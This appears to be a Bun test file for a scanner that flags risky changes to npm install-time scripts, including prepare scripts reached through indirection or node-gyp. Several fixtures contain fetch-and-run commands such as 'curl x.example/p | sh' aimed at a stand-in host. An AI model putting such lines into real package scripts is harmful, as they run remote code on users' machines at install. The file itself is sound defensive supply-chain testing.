import { describe, expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const signals = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);

describe("prepare is not an install-time signal for a registry tarball", () => {
  test("a prepare script added or changed alone does not hold", () => {
    const base = { "package.json": pj({ test: "node t.js" }), "index.js": "1\n" };
    expect(signals(base, { ...base, "package.json": pj({ test: "node t.js", prepare: "husky install" }) })).toEqual([]);
    const had = { ...base, "package.json": pj({ prepare: "husky install" }) };
    expect(signals(had, { ...had, "package.json": pj({ prepare: "node tools/setup.js" }) })).toEqual([]);
  });

  test("postinstall, install and preinstall still hold", () => {
    const base = { "package.json": pj({}), "index.js": "1\n" };
    for (const k of ["preinstall", "install", "postinstall"]) {
      expect(signals(base, { ...base, "package.json": pj({ [k]: "node setup.js" }), "setup.js": "1\n" }).length).toBeGreaterThan(0);
    }
  });

  test("prepare reached through indirection holds: a file that runs it, an escaped name", () => {
    const run = (prepare: string) => ({ "package.json": pj({ postinstall: "node s.js", prepare }), "s.js": "require('child_process').execSync('npm run prepare');\n" });
    expect(signals(run("echo hi"), run("curl x.example/p | sh")).length).toBeGreaterThan(0);
    const esc = (prepare: string) => ({ "package.json": pj({ postinstall: "npm run prep\\are", prepare }) });
    expect(signals(esc("echo hi"), esc("curl x.example/p | sh")).length).toBeGreaterThan(0);
  });

  test("a prepare another install script runs still holds", () => {
    const old = { "package.json": pj({ postinstall: "npm run prepare", prepare: "echo hi" }) };
    const next = { "package.json": pj({ postinstall: "npm run prepare", prepare: "curl https://x.example/s | sh" }) };
    expect(signals(old, next).length).toBeGreaterThan(0);
  });

  test("a file only prepare names does not hold, one a postinstall names still does", () => {
    const pre = pj({ prepare: "node tools/setup.js" });
    expect(signals({ "package.json": pre, "tools/setup.js": "1\n" }, { "package.json": pre, "tools/setup.js": "2\n" })).toEqual([]);
    const post = pj({ postinstall: "node tools/setup.js" });
    expect(signals({ "package.json": post, "tools/setup.js": "1\n" }, { "package.json": post, "tools/setup.js": "2\n" }).length).toBeGreaterThan(0);
  });
});

describe("an implicit node-gyp install keeps prepare a signal", () => {
  const gyp = "{ 'targets': [{ 'target_name': 'a', 'sources': ['<!(npm run prepare)'] }] }\n";
  test("binding.gyp with no install or preinstall: a prepare change holds", () => {
    const mk = (prepare: string) => ({ "package.json": pj({ prepare }), "binding.gyp": gyp });
    expect(signals(mk("echo hi"), mk("curl x.example/p | sh")).length).toBeGreaterThan(0);
  });
  test("gypfile true without a binding.gyp file holds too", () => {
    const mk = (prepare: string) => ({ "package.json": JSON.stringify({ name: "x", version: "1", gypfile: true, scripts: { prepare } }) });
    expect(signals(mk("echo hi"), mk("curl x.example/p | sh")).length).toBeGreaterThan(0);
  });
  test("gypfile false or no gyp file stays inert", () => {
    const off = (prepare: string) => ({ "package.json": JSON.stringify({ name: "x", version: "1", gypfile: false, scripts: { prepare } }), "binding.gyp": gyp });
    expect(signals(off("echo hi"), off("husky install"))).toEqual([]);
    const none = (prepare: string) => ({ "package.json": pj({ prepare }) });
    expect(signals(none("echo hi"), none("husky install"))).toEqual([]);
  });
});
